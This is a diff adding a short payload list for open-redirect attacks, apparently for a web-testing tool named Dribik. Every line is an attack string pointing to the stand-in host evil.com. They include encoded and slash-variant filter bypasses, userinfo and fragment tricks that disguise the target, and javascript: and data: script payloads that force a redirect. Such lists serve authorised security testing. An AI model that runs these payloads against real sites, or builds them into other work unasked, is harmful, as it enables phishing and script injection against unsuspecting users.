@@ -1,0 +1,19 @@
+# Open Redirect Payloads for Dribik
+
+https://evil.com
+//evil.com
+///evil.com
+////evil.com
+/\evil.com
+https:evil.com
+%2F%2Fevil.com
+%2f%2fevil.com
+\/\/evil.com
+//%09/evil.com
+//evil.com/%2E%2E
+//evil.com#target.com
+http://evil.com#target.com
+https://target.com@evil.com
+https://evil.com%2F@target.com
+javascript:alert(document.location='https://evil.com')
+data:text/html,<script>window.location='https://evil.com'</script>
